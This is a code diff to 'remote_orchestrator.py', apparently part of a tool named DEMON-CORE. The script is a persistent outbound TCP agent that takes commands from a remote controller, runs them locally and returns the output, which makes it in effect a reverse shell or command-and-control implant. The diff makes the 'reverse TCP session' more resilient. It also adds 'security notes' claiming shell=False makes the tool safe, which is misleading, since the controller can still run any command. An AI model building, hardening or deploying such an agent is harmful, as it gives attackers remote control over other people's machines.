@@ -5,6 +5,13 @@ remote_orchestrator.py
 Persistent outbound TCP command orchestrator for DEMON-CORE.
 Reads endpoint configuration from runtime.json.
 Couples to db_manager and messenger modules for session logging and alerts.
+
+Security notes:
+- Commands are executed with shell=False (argument list via shlex.split).
+  This prevents classic shell injection via metacharacters.
+- All side-effects (db_manager / messenger) are isolated behind try/except
+  and run AFTER the response is sent, so a lock or exception in those
+  modules can never collapse the reverse connection.
 """
 
 import json
@@ -64,16 +71,19 @@ def load_config(path: str = CONFIG_PATH) -> Tuple[str, int]:
 
 def execute_command(command_str: str) -> Tuple[str, str]:
     """
-    Execute local command via subprocess.run with stdout/stderr capture.
+    Execute local command via subprocess.run with an explicit argument list.
+    shell=False is mandatory – prevents shell metacharacter injection.
     Returns (output_text, status) where status is 'success' or 'error'.
     """
     try:
+        # shlex.split produces a safe argv list; never pass the raw string with shell=True
         args = shlex.split(command_str)
         if not args:
             return "[WARN] empty command", "error"
 
         result = subprocess.run(
             args,
+            shell=False,                    # explicit: no shell interpretation
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True,
@@ -112,10 +122,40 @@ def send_all(sock: socket.socket, data: bytes) -> bool:
         return False
 
 
+def _safe_log_session(command_str: str, output: str, status: str) -> None:
+    """
+    Isolated side-effect: never raises into the transport loop.
+    Any Database Lock / ImportError / AttributeError is swallowed.
+    """
+    if db_manager is None:
+        return
+    try:
+        if hasattr(db_manager, "log_session_event"):
+            db_manager.log_session_event(command_str, output, status)
+    except Exception as exc:
+        # Explicitly catch everything – including database locks – so the
+        # reverse TCP session stays alive.
+        logger.error("db_manager.log_session_event failed (isolated): %s", exc)
+
+
+def _safe_dispatch_alert(message_text: str) -> None:
+    """
+    Isolated side-effect: never raises into the transport loop.
+    """
+    if messenger is None:
+        return
+    try:
+        if hasattr(messenger, "dispatch_alert"):
+            messenger.dispatch_alert(message_text)
+    except Exception as exc:
+        logger.error("messenger.dispatch_alert failed (isolated): %s", exc)
+
+
 def process_stream(sock: socket.socket) -> None:
     """
     Non-blocking command ingestion loop.
-    Frames messages on newline boundaries, executes, logs, alerts, and replies.
+    Frames messages on newline boundaries, executes, replies first,
+    then performs isolated logging / alerting.
     """
     buffer = b""
     while True:
@@ -140,31 +180,17 @@ def process_stream(sock: socket.socket) -> None:
                 logger.info("executing: %s", command_str)
                 output, status = execute_command(command_str)
 
-                # Persist session event (soft coupling)
-                if db_manager is not None:
-                    try:
-                        if hasattr(db_manager, "log_session_event"):
-                            db_manager.log_session_event(command_str, output, status)
-                        else:
-                            logger.debug("db_manager has no log_session_event – skipped")
-                    except Exception as exc:
-                        logger.error("db_manager.log_session_event failed: %s", exc)
-
-                # Dispatch completion alert (soft coupling)
-                if messenger is not None:
-                    try:
-                        if hasattr(messenger, "dispatch_alert"):
-                            messenger.dispatch_alert(
-                                f"command completed status={status} cmd={command_str[:120]}"
-                            )
-                        else:
-                            logger.debug("messenger has no dispatch_alert – skipped")
-                    except Exception as exc:
-                        logger.error("messenger.dispatch_alert failed: %s", exc)
-
+                # 1. Reply to controller FIRST – transport is never blocked by side-effects
                 response = (output + "\n").encode("utf-8")
                 if not send_all(sock, response):
                     return
+
+                # 2. Side-effects AFTER the response is on the wire.
+                #    Isolated so a lock or exception cannot drop the session.
+                _safe_log_session(command_str, output, status)
+                _safe_dispatch_alert(
+                    f"command completed status={status} cmd={command_str[:120]}"
+                )
 
         except BlockingIOError:
             continue
@@ -191,12 +217,8 @@ def main() -> None:
             sock.setblocking(False)
             logger.info("connected to orchestrator %s:%d", host, port)
 
-            if messenger is not None:
-                try:
-                    if hasattr(messenger, "dispatch_alert"):
-                        messenger.dispatch_alert(f"session established {host}:{port}")
-                except Exception as exc:
-                    logger.error("messenger.dispatch_alert failed: %s", exc)
+            # Alert is isolated – failure must not prevent the session from starting
+            _safe_dispatch_alert(f"session established {host}:{port}")
 
             process_stream(sock)
 
